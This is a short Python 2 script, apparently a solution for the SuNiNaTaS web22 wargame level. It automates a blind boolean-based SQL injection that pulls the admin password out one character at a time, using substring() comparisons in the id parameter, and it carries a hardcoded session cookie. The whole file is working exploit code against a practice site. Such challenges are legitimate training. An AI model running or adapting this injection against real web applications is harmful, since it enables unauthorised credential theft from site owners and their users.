# -*- coding: cp949 -*-
import urllib2  #URL 요청을 위한 헤더를 설정하기 위한 Request 객체 수용
import urllib #URL만을 수용한다.
#https://www.programcreek.com/python/example/260/urllib2.build_opener
#https://kite.com/python/docs/urllib2
url = "http://suninatas.com/Part_one/web22/web22.asp?id="
resu=''
for j in range(1,20):
    for i in range(32,127):
        payload="admin'and(substring(pw,"+str(j)+",1)='"+chr(i)+"')--"
        payload = urllib.quote(payload)
        #print url+payload
        opener = urllib2.build_opener(urllib2.HTTPHandler)        
        request = urllib2.Request(url+payload+"&pw=1")
        request.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.125 Safari/537.36')
        request.add_header('Cookie', 'ASPSESSIONIDSSSDDTCC=EHJGAGDDJCOBFCNMEIJLMODF')
        request.get_method = lambda:'GET'
        data = opener.open(request)
        response = data.read()
        if 'size=4 color=blue>admin</f' in response:
            resu+=chr(i)
            break
            print("[+] success##########################################")
        else:
            print "[-] Fail"+url+payload+"&pw=1"
            
print resu 
